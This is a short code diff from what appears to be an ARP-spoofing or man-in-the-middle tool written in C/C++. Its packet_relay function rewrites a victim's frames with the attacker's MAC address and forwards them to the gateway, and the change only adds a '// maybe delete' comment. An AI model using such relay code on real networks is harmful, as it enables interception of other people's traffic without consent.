@@ -181,7 +181,7 @@ void packet_relay(pcap_t *handle, uint8_t *attacker_mac, uint8_t *victim_mac, ui
         Ether* eth = (Ether *)data;
 
         if(!(memcmp(eth->src,victim_mac,sizeof(uint8_t)*6))){
-            memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6);
+            memcpy(eth->src,attacker_mac,sizeof(uint8_t)*6); // maybe delete
             memcpy(eth->des,gateway_mac,sizeof(uint8_t)*6);
             int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
             if (res2 != 0) {
